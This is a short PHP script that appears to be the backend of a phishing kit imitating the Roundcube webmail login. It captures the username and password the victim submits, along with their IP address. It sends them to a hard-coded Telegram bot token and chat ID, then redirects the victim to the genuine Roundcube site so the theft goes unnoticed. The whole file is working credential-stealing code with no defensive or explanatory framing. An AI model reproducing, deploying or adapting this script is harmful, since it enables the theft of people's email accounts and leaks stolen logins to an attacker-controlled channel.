<?php
$ip = getenv("REMOTE_ADDR");
$message .= ">>>🚥 Roundcube 🚥<<<\n";
$message .= "ID: ".$_POST['login']."\n";
$message .= "PASS: ".$_POST['pass']."\n";
$message .= ">>>🚥   ChoX    🚥<<<\n";
$message .= "IP: ".$ip."\n";
$token = "6022657904:AAFr1JwXc7dtwwkDEDma3z_J6ltuafALb38";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1878662246&text=" . urlencode($message)."" );
header("Location: https://roundcube.net/");
php?>
